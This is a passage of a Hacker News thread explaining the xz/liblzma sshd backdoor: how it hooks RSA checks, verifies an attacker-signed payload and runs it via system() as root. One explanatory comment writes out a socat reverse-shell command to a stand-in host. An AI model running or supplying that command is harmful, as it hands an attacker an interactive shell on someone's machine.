| --- | --- | --- | | | |  |  | [takeda](user?id=takeda) [9 months ago](item?id=39880626)   | [root](#39878947) | [parent](#39879082) | [prev](#39880280) | [next](#39881541) [–]  I could be wrong, buy my understanding is that it isn't even a door. It simply allows anyone that has a certain private key, to send a payload that the server will execute. This won't produce any audit of someone logging in, you won't see any session etc. Any Linux with this installed would basically become a bot that can be taken over. Perhaps they could send a payload to make it DDoS another host, or payload to open a shell or payload that would install another backdoor with more functionality, and to draw attention away from this one. | | --- | --- | --- | | | |  |  | [cjbprime](user?id=cjbprime) [9 months ago](item?id=39881541)   | [root](#39878947) | [parent](#39879082) | [prev](#39880626) | [next](#39883197) [–]  It looks like the exploit path calls system() on attacker supplied input, if the check passes. I don't think we need to go into more detail than "it does whatever the attacker wants to on your computer, as root". | | --- | --- | --- | | | |  |  | [riedel](user?id=riedel) [9 months ago](item?id=39883197)   | [root](#39878947) | [parent](#39879082) | [prev](#39881541) | [next](#39880679) [–]  In a way this is really responsible backdoor. In the end this is even less dangerous than most unreported 0-days collected by public and private actors. Absurdly, I would feel reasonably safe with the compromised versions. Somebody selling botnet host would never be so careful to limit collateral damage. | | --- | --- | --- | | | |  |  | [Nathanba](user?id=Nathanba) [9 months ago](item?id=39880679)   | [root](#39878947) | [parent](#39879082) | [prev](#39883197) | [next](#39879135) [–]  I understand that we may never see the secret knock but shouldn't we have the door and what's behind it now? Doesn't this mean that the code is quite literally too hard to figure out for a human being? It's not like he can send a full new executable binary that he simply executes, then we'd see that the door is e.g the exec() call. Honestly this attempt makes me think that the entire c/c++ language stack and ecosystem is the problem. All these software shenanigans should not be needed in a piece of software like openssh but it's possible because it's written in c/c++. | | --- | --- | --- | | | |  |  | [Cloudef](user?id=Cloudef) [9 months ago](item?id=39882004)   | [root](#39878947) | [parent](#39880679) | [next](#39881488) [–]  Nothing here is something that could not be done in other languages. For example in Rust auditing this kind of supply chain attack is even more nightmarish if the project uses crates, as crates often are very small causing the "npm effect". Another good example is docker images. The way people often build docker images is not that they are build all the way from the bottom. The bottom layer(s) is/are often some arbitrary image from arbitrary source which causes a huge supply chain attack risk. | | --- | --- | --- | | | |  |  | [db48x](user?id=db48x) [9 months ago](item?id=39881488)   | [root](#39878947) | [parent](#39880679) | [prev](#39882004) | [next](#39881484) [–]  All analogies are flawed, and we are rapidly approaching the point of madness. Still, let me try. In this case, someone on the inside of the building looked in a dusty closet and saw a strange pair of hinges on the wall of the closet. Turns out that the wall of the closet is an exterior wall adjoining the alley back behind the building! At least they know which contractor built this part of the building. Further examination revealed the locking mechanism that keeps the secret door closed until the correct knock is used. But because the lock is based on the deep mathematics of prime numbers, no mere examination of the lock will reveal the pattern of locks that will open it. The best you could do is sit there and try every possible knocking pattern until the door opens, and that would take the rest of your life, plus the rest of the lifetime of the Earth itself as well. Incidentally, I could write the same exploit in rust or any other safe language; no language can protect against a malicious programmer. As for detecting use of the back door, that's not entirely out of the question. However it sounds like it would not be as easy as logging every program that sshd calls exec on. But the audit subsystem should notice and record the activity for later use in your post–mortem investigation. | | --- | --- | --- | | | |  |  | [ivlad](user?id=ivlad) [9 months ago](item?id=39881484)   | [root](#39878947) | [parent](#39880679) | [prev](#39881488) | [next](#39881445) [–]  This is literally what the top post link is about. The backdoor functionality has been (roughly) figured out: after decryption and signature verification it passes the payload received in the signing key of the clients authentication certificate to system(). C/C++ is not a problem here because sshd has to run things to open sessions for users. | | --- | --- | --- | | | |  |  | [djao](user?id=djao) [9 months ago](item?id=39881445)   | [root](#39878947) | [parent](#39880679) | [prev](#39881484) | [next](#39881549) [–]  The payload is simply remote code execution. But we'll never know the secret knock that triggers it, and we can't probe existing servers for the flaw because we don't konw the secret knock. I imagine that we could in short order build ourselves a modified version of the malware, which contains a different secret knock, one that we know in advance, and then test what would have happened with the malware when the secret knock was given. But this still doesn't help us probe existing servers for the flaw, because those servers aren't running our modified version of the malware, they're running the original malware. | | --- | --- | --- | | | |  |  | [creato](user?id=creato) [9 months ago](item?id=39881549)   | [root](#39878947) | [parent](#39880679) | [prev](#39881445) | [next](#39882805) [–]  > Honestly this attempt makes me think that the entire c/c++ language stack and ecosystem is the problem. All these software shenanigans should not be needed in a piece of software like openssh but it's possible because it's written in c/c++. Nothing about this relies on a memory safety exploit. It's hard to figure out because it's a prebuilt binary and it's clever. Unless you meant "all compiled languages" and not C/C++ specifically, it's irrelevant. The right thing to argue against based on your instinct (no one can figure out what is going on) is: it should be unacceptable for there to be prebuilt binaries committed to the source code. | | --- | --- | --- | | | |  |  | [usrusr](user?id=usrusr) [9 months ago](item?id=39882805)   | [root](#39878947) | [parent](#39880679) | [prev](#39881549) | [next](#39882627) [–]  The "stuff behind the door" is conveniently uploaded with the secret knock. It's not there and it will never be because it's remotely executed without getting written down. The attacker does send executable code, singed and encrypted (or only one of them? It does not matter) with their private key. The door checks anything incoming for a match with the public key it has and executes when happy. C++ has nothing to do with this, it's the dynamic linking mechanism that allows trusted code the things it allows trusted code to do (talking about the hooking that makes the key check possible, not about the execution that comes after - that is even more mundane, code can execute code, it's a von Neumann architecture after all). | | --- | --- | --- | | | |  |  | [mrln](user?id=mrln) [9 months ago](item?id=39882627)   | [root](#39878947) | [parent](#39880679) | [prev](#39882805) | [next](#39883458) [–]  It's not too hard to figure out. People are figuring it out. If anything is too hard, it's due to obfuscation - not C/C++ shenanigans. As far as I understand from scrolling through these comments, an attacker can send a command that is used with the system() libc call. So the attacker basically has a root shell. | | --- | --- | --- | | | |  |  | [zettabomb](user?id=zettabomb) [9 months ago](item?id=39883458)   | [root](#39878947) | [parent](#39880679) | [prev](#39882627) | [next](#39879135) [–]  Can we stop the ridiculous C++ fearmongering? You can make vulnerable software in any language, and you can do social engineering on any software. | | --- | --- | --- | | | |  |  | [nullc](user?id=nullc) [9 months ago](item?id=39883922)   | [root](#39878947) | [parent](#39883458) | [next](#39879135) [–]  The people who are busy inserting backdoors in all the "rewrite it in rust" projects where anonymous never heard from before new to programming randos rewrite long trusted high security projects in rust would presumably very much like everyone elses attention directed elsewhere. | | --- | --- | --- | | | |  |  | [crotchfire](user?id=crotchfire) [9 months ago](item?id=39886814)   | [root](#39878947) | [parent](#39883922) | [next](#39879135) [–]  It's okay, the Cargo Lords promise me that because they require a git-hub account and agreeing to the git-hub terms of service before contributing, everything will be okay. They pinky-swear. | | --- | --- | --- | | | |  |  | [skywhopper](user?id=skywhopper) [9 months ago](item?id=39879135)   | [parent](#39878947) | [prev](#39879082) | [next](#39879141) [–]  From what I’ve read I *think* the attack vector is: 1. sshd starts and loads the libsystemd library which loads the XZ library which contains the hack 2. The XZ library injects its own versions of functions in openssl that verify RSA signatures 3. When someone logs into SSH and presents a signed SSH certificate as authentication, those hacked functions are called 4. The certificate, in turn, can contain arbitrary data that in a normal login process would include assertions about username or role that would be used to determine if the certificate is valid for use logging in as the particular user. But if the hacked functions detect that the certificate was signed by a *specific* attacker key, they take some subfield of the certificate and execute it as a command on the system in the sshd context (ie, as the root user). Unfortunately, we don’t know the attacker’s signing key, just the public key the hacked code uses to validate it. But basically this would give the attacker a way to run any command as root on any compromised system without leaving much of a trace, beyond the (presumably failed) login attempt, which any system on the internet will be getting a lot of anyway. | | --- | --- | --- | | | |  |  | [ghostpepper](user?id=ghostpepper) [9 months ago](item?id=39879402)   | [root](#39878947) | [parent](#39879135) | [next](#39882648) [–]  > beyond the (presumably failed) login attempt There is some evidence it's scrubbing logs so we might not even have that. | | --- | --- | --- | | | |  |  | [Deathcrow](user?id=Deathcrow) [9 months ago](item?id=39881865)   | [root](#39878947) | [parent](#39879402) | [next](#39882648) [–]  Is there really a failed login attempts? If it never calls the real functions of ssh in case of their own cert+payload why would sshd log anything or even register a login attempt? Or does the backdoor function hook in after sshd already logged stuff? | | --- | --- | --- | | | |  |  | [skywhopper](user?id=skywhopper) [9 months ago](item?id=39882787)   | [root](#39878947) | [parent](#39881865) | [next](#39881988) [–]  I think it would depend on logging level, yeah. I’ve not seen one way or another whether it aborts the login process or prevents logging, but that’s possible, and would obviously be a good idea. Then the question would be if you could detect the difference between a vulnerability-aborted login attempt and just a malformed/interrupted login attempt. But in the case of this specific attack, probably the safest approach would be to watch and track what processes are being spawned by sshd. Which in retrospect is probably advisable for any network daemon. (Of course, lots of them will be sloppy and messy with how they interact with the system and it might be next to impossible to tell attacks from “legit” behavior. But sshd is probably easier to pin down to what’s “safe” or not. | | --- | --- | --- | | | |  |  | [numpad0](user?id=numpad0) [9 months ago](item?id=39881988)   | [root](#39878947) | [parent](#39881865) | [prev](#39882787) | [next](#39882648) [–]  Depending on log level, isn't there going to be lines up to receiving the payload? | | --- | --- | --- | | | |  |  | [xinayder](user?id=xinayder) [9 months ago](item?id=39882648)   | [root](#39878947) | [parent](#39879135) | [prev](#39879402) | [next](#39896980) [–]  > When someone logs into SSH and presents a signed SSH certificate as authentication, those hacked functions are called So if I only use pubkey auth and ED25519, there's no risk? Besides this, just to understand it better, if someone tries to login to your server with the attacker's certificate, the backdoor will disable any checks for it and allow the remote user to login as root (or any other arbitrary user) even if root login is disabled in sshd config? | | --- | --- | --- | | | |  |  | [skywhopper](user?id=skywhopper) [9 months ago](item?id=39882771)   | [root](#39878947) | [parent](#39882648) | [next](#39896980) [–]  I don’t think we know enough to be sure even disabling certificate auth would prevent this. But from what I can tell it probably wouldn’t *directly* allow arbitrary user login. It only seems to allow the execution of an arbitrary command. But of course that command might do something that would break any other security on the system. But, one clever thing about this attack is that the commands being run wouldn’t be caught by typical user-login tracking, since there’s no “login”. The attacker is just tricking sshd into running a command. | | --- | --- | --- | | | |  |  | [MuffinFlavored](user?id=MuffinFlavored) [9 months ago](item?id=39896980)   | [root](#39878947) | [parent](#39879135) | [prev](#39882648) | [next](#39884200) [–]  > 2. The XZ library injects its own versions of functions in openssl that verify RSA signatures Specifically how did the xz library patch/hook/inject into the openssl functions that verify RSA signatures? | | --- | --- | --- | | | |  |  | [jvans](user?id=jvans) [9 months ago](item?id=39884200)   | [root](#39878947) | [parent](#39879135) | [prev](#39896980) | [next](#39879141) [–]  So is the implication here that any system that allows SSH and contains this malicious code is vulnerable? | | --- | --- | --- | | | |  |  | [plg94](user?id=plg94) [9 months ago](item?id=39879141)   | [parent](#39878947) | [prev](#39879135) | [next](#39879173) [–]  I don't think we know what exactly this does, yet. I can only answer one of those questions, as far as I understand the "unreplayable" part is refering to this: > Apparently the backdoor reverts back to regular operation if the payload is malformed or \*the signature from the attacker's key doesn't verify\*. emphasis mine, note the "signature of the attacker's key". So unless that key is leaked, or someone breaks the RSA algorithm (in which case we have *far* bigger problems), it's impossible for someone else (researcher or third-party) to exploit this backdoor. | | --- | --- | --- | | | |  |  | [cryptonector](user?id=cryptonector) [9 months ago](item?id=39880021)   | [root](#39878947) | [parent](#39879141) | [next](#39879780) [–]  It's not using RSA. It's *hooking* RSA. And the attacker's signature is Ed448, not RSA. | | --- | --- | --- | | | |  |  | [rmi\_](user?id=rmi_) [9 months ago](item?id=39879780)   | [root](#39878947) | [parent](#39879141) | [prev](#39880021) | [next](#39879555) [–]  > So unless that key is leaked But, just for replayability, we could "patch" the exploit with a known key and see what it does, don't we? | | --- | --- | --- | | | |  |  | [swid](user?id=swid) [9 months ago](item?id=39879883)   | [root](#39878947) | [parent](#39879780) | [next](#39882870) [–]  Replayability means something different in this context. First, we do know the backdoor will pass the payload to system, so in general it is like an attacker has access to bash, presumably as root since it is sshd. Replayability means, if someone were to catch a payload in action which did use the exploit, you can’t resend the attacker’s data and have it work. It might contain something like a date or other data specific only to the context it came from. This makes a recorded attack less helpful for developing a test… since you can’t replay it. | | --- | --- | --- | | | |  |  | [tialaramex](user?id=tialaramex) [9 months ago](item?id=39880336)   | [root](#39878947) | [parent](#39879883) | [next](#39882870) [–]  > It might contain something like a date or other data specific only to the context it came from. In all these modern protocols, including SSHv2 / SecSH (Sean Connery fans at the IETF evidently) both parties deliberately introduce random elements into a signed conversation as a liveness check - precisely to prevent replaying previous communications. TLS 1.3's zero round-trip (ORT) mode cannot do this, which is why it basically says you'd better be damn sure you've figured out exactly why it's safe to use this, including every weird replay scenario and why it's technically sound in your design or else you *must* not enable it. We may yet regret the whole thing and just tell everybody to refuse it. | | --- | --- | --- | | | |  |  | [usrusr](user?id=usrusr) [9 months ago](item?id=39882870)   | [root](#39878947) | [parent](#39879780) | [prev](#39879883) | [next](#39885036) [–]  What could be done, I think, is patch the exploit into logging the payload (and perhaps some network state?) instead of executing it to be able to analyse it. Analyse it, in the unlikely case that the owner of the key would still try their luck using it after discovery, on a patched system. What it does: it's full RCE, remote code execution, it does whatever the attacker decides to upload. No mystery there. | | --- | --- | --- | | | |  |  | [chii](user?id=chii) [9 months ago](item?id=39885036)   | [root](#39878947) | [parent](#39879780) | [prev](#39882870) | [next](#39879555) [–]  > see what it does it does whatever the decrypted/signed payload tells the backdoor to execute - it's sent along with the key. The backdoor is just that - a backdoor to let in that payload (which will have come from the attacker in the future when they're ready to use this backdoor). | | --- | --- | --- | | | |  |  | [superb\_dev](user?id=superb_dev) [9 months ago](item?id=39879555)   | [root](#39878947) | [parent](#39879141) | [prev](#39879780) | [next](#39879551) [–]  This feels very targeted | | --- | --- | --- | | | |  |  | [Ekaros](user?id=Ekaros) [9 months ago](item?id=39879567)   | [root](#39878947) | [parent](#39879555) | [next](#39885451) [–]  Or very untargeted. Something intended just to lay dormant by chance if succeeded... It is very good backdoor to have if you at whatever time have dozens of options. See sshd running, test this you are done if it works, if not move to something else. | | --- | --- | --- | | | |  |  | [dools](user?id=dools) [9 months ago](item?id=39879656)   | [root](#39878947) | [parent](#39879567) | [next](#39885451) [–]  Or targeted not really at doing anything but at researching the nature of supply chain vulnerabilities themselves. | | --- | --- | --- | | | |  |  | [takeda](user?id=takeda) [9 months ago](item?id=39880686)   | [root](#39878947) | [parent](#39879656) | [next](#39881547) [–]  This doesn't look like a research. This looks like state sponsored attack. Imagine having a backdoor that you can just go to any Linux server and with your key you can make it execute any code you wish without any audit trail. And no one without the key can do it, so even if your citizens use such vulnerable system other states won't be able to use your backdoor. | | --- | --- | --- | | | |  |  | [cjbprime](user?id=cjbprime) [9 months ago](item?id=39881547)   | [root](#39878947) | [parent](#39879656) | [prev](#39880686) | [next](#39885451) [–]  Spending two years *actually maintaining* an open source project that you will later backdoor is a very expensive way to perform such research. | | --- | --- | --- | | | |  |  | [yencabulator](user?id=yencabulator) [9 months ago](item?id=39885451)   | [root](#39878947) | [parent](#39879555) | [prev](#39879567) | [next](#39879551) [–]  Untargeted (backdoor goes almost everywhere), but very selective (backdoor can only be triggered by the original attacker). <https://en.wikipedia.org/wiki/NOBUS> | | --- | --- | --- | | | |  |  | [BlueFalconHD](user?id=BlueFalconHD) [9 months ago](item?id=39879551)   | [root](#39878947) | [parent](#39879141) | [prev](#39879555) | [next](#39880037) [–]  It would be really cool if in 20 years when we have quantum computers powerful enough we could see what this exploit does. | | --- | --- | --- | | | |  |  | [denysvitali](user?id=denysvitali) [9 months ago](item?id=39879748)   | [root](#39878947) | [parent](#39879551) | [next](#39882145) [–]  My understanding is that we know somehow already what the exploit allows the attacker to do - we just can't reproduce it because we don't have their private key. Technically, we can modify the backdoor and embed our own public key - but there is no way to probe a random server on the internet and check if it's vulnerable (from a scanner perspective). In a certain way it's a good thing - only the creator of the backdoor can access your vulnerable system... | | --- | --- | --- | | | |  |  | [tialaramex](user?id=tialaramex) [9 months ago](item?id=39880391)   | [root](#39878947) | [parent](#39879748) | [next](#39882145) [–]  It's a NOBUS (Nobody But Us can use it) attack. The choice to use a private key means it's possible that even the person who submitted the tampered code doesn't have the private key, only some other entity controlling them does. | | --- | --- | --- | | | |  |  | [kortilla](user?id=kortilla) [9 months ago](item?id=39882145)   | [root](#39878947) | [parent](#39879551) | [prev](#39879748) | [next](#39883208) [–]  We do know what it does. If it decrypts it just passes to system(). | | --- | --- | --- | | | |  |  | [password4321](user?id=password4321) [9 months ago](item?id=39883208)   | [root](#39878947) | [parent](#39879551) | [prev](#39882145) | [next](#39880037) [–]  AFAIK still no luck with Gauss from 2012 <https://securelist.com/gauss-abnormal-distribution/36620/> | | --- | --- | --- | | | |  |  | [cryptonector](user?id=cryptonector) [9 months ago](item?id=39880037)   | [root](#39878947) | [parent](#39879141) | [prev](#39879551) | [next](#39879173) [–]  I don't understand yet where the "unreplayable" part comes from, but this isn't it. | | --- | --- | --- | | | |  |  | [yencabulator](user?id=yencabulator) [9 months ago](item?id=39885496)   | [root](#39878947) | [parent](#39880037) | [next](#39879173) [–]  Replayable: You observe attack against server A, you can take that attack and perform it against server B. This attack is unreplayable because it cryptographically ties into the SSH host key of the server. | | --- | --- | --- | | | |  |  | [cryptonector](user?id=cryptonector) [9 months ago](item?id=39885624)   | [root](#39878947) | [parent](#39885496) | [next](#39879173) [–]  I know what replayable means. But even with your explanation of what makes it unreplayable it's not strictly true: you could replay the attack on the server it was originally played against. | | --- | --- | --- | | | |  |  | [yencabulator](user?id=yencabulator) [9 months ago](item?id=39885690)   | [root](#39878947) | [parent](#39885624) | [next](#39879173) [–]  Sure. But the interest is in being able to talk to server B to figure out if it's vulnerable; that's impossible, because the attack can't be replayed to it. | | --- | --- | --- | | | |  |  | [cryptonector](user?id=cryptonector) [9 months ago](item?id=39887730)   | [root](#39878947) | [parent](#39885690) | [next](#39879173) [–]  Thanks. | | --- | --- | --- | | | |  |  | [q3k](user?id=q3k) [9 months ago](item?id=39879173)   | [parent](#39878947) | [prev](#39879141) | [next](#39879320) [–]  > The OP makes it sound like an attacker can send a malicious payload in the pre-auth phase of an SSH session - but why does he say that an exploit might never be available? Surely if we can reverse the code we can write a PoC? Not if public-key cryptography was used correctly, and if there are no exploitable bugs. | | --- | --- | --- | | | |  |  | [jnwatson](user?id=jnwatson) [9 months ago](item?id=39880219)   | [root](#39878947) | [parent](#39879173) | [next](#39879320) [–]  We understand it completely. However, since determining the private key that corresponds to the public key embedded in the backdoor is practically infeasible, we can't actually exercise it. Someone could modify the code with a known ed448 private key and exercise it, but the point of having the PoC is to scan the internet and find vulnerable servers. | | --- | --- | --- | | | |  |  | [ajross](user?id=ajross) [9 months ago](item?id=39879320)   | [parent](#39878947) | [prev](#39879173) | [next](#39879099) [–]  > The OP makes it sound like an attacker can send a malicious payload in the pre-auth phase of an SSH session - but why does he say that an exploit might never be available? The exploit as shipped is a binary (cleverly hidden in the test data), not source. And it validates the payload vs. a private key that isn't known to the public. Only the attacker can exercise the exploit currently, making it impossible to scan for (well, absent second order effects like performance, which is how it was discovered). | | --- | --- | --- | | | |  |  | [snnn](user?id=snnn) [9 months ago](item?id=39879099)   | [parent](#39878947) | [prev](#39879320) | [next](#39879722) [–]  That's the most interesting part. No, we don't know it yet. The backdoor is so sophisticated that none of us can fully understand it. It is not a “usual” security bug. | | --- | --- | --- | | | |  |  | [mrln](user?id=mrln) [9 months ago](item?id=39882674)   | [root](#39878947) | [parent](#39879099) | [next](#39881731) [–]  What makes you say that? I haven't started reverse engineerinng it myself, but from all I have read, people who did have a very good understanding of what it does. They just can't use it themselves, because they would need to have the attacker's private key. | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39881731)   | [root](#39878947) | [parent](#39879099) | [prev](#39882674) | [next](#39879195) [–]  It’s not that we can’t understand it, it’s just that work to understand it is ongoing. | | --- | --- | --- | | | |  |  | [heresWaldo](user?id=heresWaldo) [9 months ago](item?id=39879195)   | [root](#39878947) | [parent](#39879099) | [prev](#39881731) | [next](#39879722) [–]  Yeah these types of security issues will be used by politicians to force hardware makers to lockdown hardware, embed software in chips. The go fast startups habit of “import the world to make my company products” is a huge security issue IT workers ignore. The only solution politics and big tech will chase is obsolete said job market by pulling more of the stack into locked down hardware, with updates only allowed to come from the gadget vendor. | | --- | --- | --- | | | |  |  | [georgyo](user?id=georgyo) [9 months ago](item?id=39879312)   | [root](#39878947) | [parent](#39879195) | [next](#39879336) [–]  I'm not saying political forces won't try legislating the problem away, but that won't even help here. A supply chain attack can happen in hardware or software. Hardware has firmware, which is software. What makes this XZ attack so scary is that it was directly from a "trusted" source. A similar attack could come from any trusted source. At least with software it is much easier to patch. | | --- | --- | --- | | | |  |  | [heresWaldo](user?id=heresWaldo) [9 months ago](item?id=39880981)   | [root](#39878947) | [parent](#39879312) | [next](#39879336) [–]  Like you said it has firmware which is flashable. Secure enclaves are never 100% secure but if only, for example, Apple can upload to them, it dramatically reduces some random open source project being git pulled. Apple may still pull open source but they would be on the hook to avoid this. Open sources days of declaring “use at your risk” have become a liability in this hyper networked society. It’s now becoming part of the problem it was imagined up to solve. | | --- | --- | --- | | | |  |  | [avidiax](user?id=avidiax) [9 months ago](item?id=39879336)   | [root](#39878947) | [parent](#39879195) | [prev](#39879312) | [next](#39879322) [–]  The NSA demands that Intel and AMD provide backdoor ways to turn off the IME/PSP, which are basically a small OS running in a small processor inside your processor. So the precedent is that the government wants less embedded software in their hardware, at least for themselves. If we relied on gadget vendors to maintain such software, I think we can just look at any IoT or router manufacturer to get an idea of just how often and for how long they will update the software. So that idea will probably backfire spectacularly if implemented. | | --- | --- | --- | | | |  |  | [BlueFalconHD](user?id=BlueFalconHD) [9 months ago](item?id=39879560)   | [root](#39878947) | [parent](#39879336) | [next](#39879322) [–]  What does the IME or PSP do? | | --- | --- | --- | | | |  |  | [timschmidt](user?id=timschmidt) [9 months ago](item?id=39879653)   | [root](#39878947) | [parent](#39879560) | [next](#39881641) [–]  Short answer: anything it wants. IME has privileged access to the MMU(s), all system memory, and even out-of-band access to the network adapter such the the OS cannot inspect network traffic originating with or destined for the IME. | | --- | --- | --- | | | |  |  | [CobrastanJorji](user?id=CobrastanJorji) [9 months ago](item?id=39881641)   | [root](#39878947) | [parent](#39879560) | [prev](#39879653) | [next](#39879322) [–]  Lots. It's basically an extra processor that runs at all times, even when your computer is supposedly "off." Its firmware is bigger than you'd think, like a complete Unix system big. It's frankly terrifying how powerful and opaque it is. It provides a lot around remote management for corporations, lots of "update the BIOS remotely" sort of features, and also a bunch of those stupid copy protection enforcement things. Plus some startup/shutdown stuff like Secure Boot. | | --- | --- | --- | | | |  |  | [berkes](user?id=berkes) [9 months ago](item?id=39879322)   | [root](#39878947) | [parent](#39879195) | [prev](#39879336) | [next](#39879328) [–]  Why would "embed software in chips" be a solution? If anything, I'd expect it to be an even bigger risk, because when (not if) a security issue is found in the hardware, you now have no way to fix it, other than throwing out this server/fridge/toothbrush or whatever is running it. | | --- | --- | --- | | | |  |  | [heresWaldo](user?id=heresWaldo) [9 months ago](item?id=39879619)   | [root](#39878947) | [parent](#39879322) | [next](#39879328) [–]  A flashable secure enclave segment in the hardware stack is an option to patch around embedded bugs. I haven’t worked in hardware design since the era of Nortel, and it was way different back then but the general physics are the same; if, else, while, and math operations in the hardware are not hard. In fact your hardware *is* a general while loop; while has power, iterate around refreshing these memory states with these computed values, even in the absence of user input (which at the root is turning it on). Programmers have grown accustomed to being necessary to running ignorant business machines but that’s never been a real requirement. Just a socialized one. And such memes are dying off. | | --- | --- | --- | | | |  |  | [WesolyKubeczek](user?id=WesolyKubeczek) [9 months ago](item?id=39879328)   | [root](#39878947) | [parent](#39879195) | [prev](#39879322) | [next](#39879722) [–]  Which will make updates either expensive or impossible. You will be able to write books about exploitable bugs in the hardware, and those books will easily survive several editions. | | --- | --- | --- | | | |  |  | [junon](user?id=junon) [9 months ago](item?id=39879722)   | [parent](#39878947) | [prev](#39879099) | [next](#39884368) [–]  Siblings saying "we don't know" haven't really groked the post I don't think. If I'm understanding the thread correctly, here's a (not so) succinct explanation. Please, if you know better than I do, correct me if I've made an error in my understanding. `system()` is a standard C function that takes a string as input and runs it through `sh`, like so: ```     sh -c "whatever input"  ``` It's used as a super rudimentary way to run arbitrary shell commands from a C program, using the `execl()` call under the hood, just like you'd run them on a bash/sh/fish/zsh/whatever command line. ```     system("echo '!dlroW ,olleH' | rev");  ``` Those commands run mostly in the same privilege context as the process that invoked `system()`. If the call to `system()` came from a program running as root, the executed command is also run as root. The backdoor utilizes this function in the code that gets injected into `sshd` by way of liblzma.so, a library for the LZMA compression algorithm (commonly associated with the `.xz` extension). Jia Tan, the person at the center of this whole back door, has been a maintainer of that project for several years now. Without going too much into *how* the injected code gets into the `sshd` process, the back door inserts itself into the symbol lookup process earlier than other libraries, such as libcrypto and openssl. What this means is (and I'm over-simplifying a lot), when the process needs to map usages of e.g. `SSL\_decrypt\_key()` that were linked to dynamic libraries (as opposed to be statically linked and thus included directly into `sshd`), to real functions, it does a string-wise lookup to see where it can find it. It runs through a list of dynamic libraries that might have it and sees if they export it. If they do, it gets the address of the exported function and remembers where it's at so that further calls to that function can be found quickly, without another search. This is how DLLs and SOs (dynamic libraries) are linked to the process that needs them at runtime without the process needing to know *exactly* where the functions that they need are located. The back door hijacks this mechanism to insert its own functions in some of those places, so that when `sshd` thinks it's calling `SSL\_decrypt\_key()`, it's really calling some malicious function in the back door - which can then choose to do something with the data passed to the function call, or it can choose to forward the call to the *real* function. It makes use of this when `sshd` needs to validate RSA information passed to the server via a client connection during authentication. An RSA key has a bunch of fields, one of which is the 'n' field - the public key data itself. OpenSSL implements this as a BIGNUM, or a variable-length, potentially very large number. It's more or less read in as a bag of bytes, and its meaning depends on the underlying encryption algorithm. This is the mechanism behind "public key authentication" when connecting to servers, and is generally more secure than e.g. username/password authentication. The back door intercepts the call to check the RSA data, pulls out the 'n' parameter, and tries to decrypt it using ChaCha20. There's no way for it to know if it's decrypted beforehand, but generally encryption algorithms have a way to error-check and report failures - that, or you add some well known piece of information into the encrypted data that you can verify once it's decrypted. Either way, the back door checks to see if it's really an encrypted string. If not, it forwards the call back to the original RSA check mechanism so that sshd can process it normally. However, if the decryption succeeds, *the back door passes the decrypted string to `system()`.* This means that a random client connecting to an SSH server can craft an RSA public key that is really an encrypted, malicious payload to run any arbitrary shell command under which the same user `sshd` is running - oftentimes root. Not only that, but the back door *also* checks the incoming RSA structure to see if it's coming from the person who made it. This prevents any of us finding this exploit and using it ourselves, even if we know our target is infected. It's a completely exclusive back door to whomever holds the private key used by the back door to sort of 'authenticate' the exploit itself. This is much worse than what many of us thought it was before - a public key auth bypass - which would have meant that you'd only gain access to any user allowed to log in via SSH. SSH's configuration file has a setting that disables root logins under any circumstances that is generally enabled on production systems for obvious reasons. However, with it being an RCE, SSH servers running as root would execute the payloads *as root*. From there, they could easily run socat and have the system connect to a server of their choice to gain a remote interactive shell, for example: ```     socat TCP:example.com:1234 SYSTEM:"bash -l"  ``` The possibilities are really endless. They'd effectively have a skeleton key that only they could use (or sell) that, with enough time for people to upgrade their version of `sshd`, would allow them access to just about any SSH server they could connect to, oftentimes with root permissions. Hope that explains it a bit. | | --- | --- | --- | | | |  |  | [Denvercoder9](user?id=Denvercoder9) [9 months ago](item?id=39880387)   | [root](#39878947) | [parent](#39879722) | [next](#39882342) [–]  > Siblings saying "we don't know" haven't really groked the post I don't think. The reason for saying "we don't know" is not that we don't understand what's detailed in TFA, but that the backdoor embeds a 88 kB object file into liblzma, and nobody has fully reverse engineered and understood *all* that code yet. There might be other things lurking in there. | | --- | --- | --- | | | |  |  | [takeda](user?id=takeda) [9 months ago](item?id=39882342)   | [root](#39878947) | [parent](#39879722) | [prev](#39880387) | [next](#39881787) [–]  > They'd effectively have a skeleton key that only they could use (or sell) that this looks more like state sponsored attack and it doesn't look like someone joining and at one point realizing they want to implement this backdoor. The guy joined the project 2 years ago, developed a test framework (which he then used to hide binary of the backdoor in which appears that is complex and others are still figuring out how it works) then he gradually disabled various security checks before activating it. | | --- | --- | --- | | | |  |  | [sureglymop](user?id=sureglymop) [9 months ago](item?id=39881787)   | [root](#39878947) | [parent](#39879722) | [prev](#39882342) | [next](#39884368) [–]  Thank you for the detailed write up. This made me think, why do we actually let sshd run as root? Would it be possible to only run a very unsophisticated ssh server as root that depending on the user specified in the incoming connection just coordinates that connection to the actual user and let the server run there? This could be so simplistic that a backdoor would more easily be detected. | | --- | --- | --- | | | |  |  | [junon](user?id=junon) [9 months ago](item?id=39883327)   | [root](#39878947) | [parent](#39881787) | [next](#39884368) [–]  Because it needs to be able to spawn processes as any user. | | --- | --- | --- | | | |  |  | [matheusmoreira](user?id=matheusmoreira) [9 months ago](item?id=39884368)   | [parent](#39878947) | [prev](#39879722) | [next](#39883063) [–]  Attacker wants to be able to send an especially crafted public key to their target's server's sshd. That crafted key is totally bogus input, a normal sshd would just probably reject it as invalid. The bits embedded into the key are actually malicious code, encrypted/signed with the attacker's secret key. In order to achieve their objective, they engineered a backdoor into sshd that hooks into the authentication functions which handle those keys. Whenever someone sends a key, it tries to decrypt it with the attacker's keys. If it fails, proceed as usual, it's not a payload. If it successfully decrypts, it's time for the sleeper agent to wake up and pipe that payload into a brand new process running as root. | | --- | --- | --- | | | |  |  | [rubymamis](user?id=rubymamis) [9 months ago](item?id=39883063)   | [prev](#39878947) | [next](#39880261) [–]  It baffles me how such an important package that so many Linux servers use every day is unmaintained by the original author due to insufficient funds. Something gotta change in OSS. I think one solution could be in licenses that force companies/business of certain sizes to pay maintenance fees. One idea from the top of my head. | | --- | --- | --- | | | |  |  | [nicce](user?id=nicce) [9 months ago](item?id=39883711)   | [parent](#39883063) | [next](#39883753) [–]  > I think one solution could be in licenses that force companies/business of certain sizes to pay maintenance fees. One idea from the top of my head. Yet people have huge opposition for those licenses. The big scream of "not free anymore" starts and the entity gets cancelled. | | --- | --- | --- | | | |  |  | [rubymamis](user?id=rubymamis) [9 months ago](item?id=39883738)   | [root](#39883063) | [parent](#39883711) | [next](#39884038) [–]  I think focusing on big organizations (e.g. above certain revenue/profit should help). There must be some sweet spot, after all, the organizations that rely on it should want it to be maintained as well. | | --- | --- | --- | | | |  |  | [chii](user?id=chii) [9 months 